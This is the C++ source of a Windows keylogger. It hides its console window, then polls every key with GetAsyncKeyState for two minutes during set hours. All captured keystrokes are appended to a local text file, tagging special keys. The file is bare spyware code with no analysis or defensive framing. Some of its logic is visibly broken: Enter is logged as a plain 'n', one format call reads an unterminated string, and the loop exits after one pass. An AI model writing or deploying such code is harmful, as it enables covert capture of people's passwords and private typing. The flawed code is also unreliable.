#include<iostream>
#include<windows.h>
#include<ctime>

using namespace std;

int saveKey(char key, char* fpr)
{
    Sleep(10);
    FILE *file;
    file = fopen(fpr,"a+");
    if (key == 8) 
        fprintf(file, "%s", "[BACKSPACE]");  
    else if (key == 13)
        fprintf(file, "%s", "n");
    else if (key == 32)
        fprintf(file, "%s", " ");
    else if (key == VK_TAB)        
        fprintf(file, "%s", "[TAB]");
    else if (key == VK_SHIFT)
        fprintf(file, "%s", "[SHIFT]");
    else if (key == VK_CONTROL)
        fprintf(file, "%s", "[CONTROL]");
    else if (key == VK_ESCAPE)
        fprintf(file, "%s", "[ESCAPE]");
    else if (key == VK_END)
        fprintf(file, "%s", "[END]");
    else if (key == VK_HOME)
        fprintf(file, "%s", "[HOME]");
    else if (key == VK_LEFT)
        fprintf(file, "%s", "[LEFT]");
    else if (key == VK_UP)
        fprintf(file, "%s", "[UP]");
    else if (key == VK_RIGHT)
        fprintf(file, "%s", "[RIGHT]");
    else if (key == VK_DOWN)
        fprintf(file, "%s", "[DOWN]");
    else if (key == VK_RETURN)
        fprintf(file, "%s", "[ENTER]");
    else if (key == 190 || key == 110)
        fprintf(file, "%s", ".");
    else
        fprintf(file, "%s", &key);
    fclose(file);
    return 0;
}

int main()
{
    SYSTEMTIME st;
    FreeConsole();
    while (true)
    {
        Sleep(10);
        GetLocalTime(&st);
        //KeyLogging between 10:00AM(included) and 03:00PM(excluded)
        if(st.wHour>=10 && st.wHour<=14)
        {
            //keylogging for next 2 minutes
            clock_t start = clock();
            while((clock()-start)/(double)CLOCKS_PER_SEC<120)
            {
                for (int i = 8; i <= 255; i++)
                    if (GetAsyncKeyState(i) == -32767)
                        saveKey(i,"KeyStrokes.txt");
            }
        }
        break;
    }
    return 0;
}